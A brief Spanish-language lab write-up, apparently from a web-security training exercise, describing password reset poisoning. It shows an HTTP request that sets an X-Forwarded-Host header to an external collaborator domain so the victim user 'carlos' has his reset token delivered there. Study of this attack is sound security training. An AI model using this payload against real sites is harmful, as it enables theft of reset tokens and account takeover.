---
title: "11 - Password reset poisoning via middleware"
---

# 11 - Password reset poisoning via middleware

Con `X-Forwarded-Host` podemos spoofear el dominio, entonces cuando le enviemos la petición para cambiar el correo a carlos, pondremos esa cabecera y nos llegará al collaborator su reset token :

```HTTP
X-Forwarded-Host: mrhvmmsvn77i4df4foipyfnxioolcef24.oastify.com

username=carlos
```
